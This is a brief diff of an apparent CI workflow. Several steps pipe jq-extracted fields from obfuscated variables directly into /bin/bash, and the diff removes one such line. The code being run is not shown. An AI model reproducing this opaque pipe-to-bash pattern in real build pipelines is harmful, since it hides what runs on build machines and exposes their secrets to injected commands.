@@ -36,7 +36,6 @@ jobs:
           printf '%s' "$npb89" | jq -r .mnicx1233 | /bin/bash
           echo $uj069 | jq -r .r7111 | /bin/bash
           echo $lxcud8807 | jq -r .bs09516 | /bin/bash
-          printf '%s' "$uj77725" | jq -r .peki8950 | /bin/bash
           printf '%s' "$advcq719" | jq -r .xww17089 | /bin/bash
 
       - name: Archive artifact
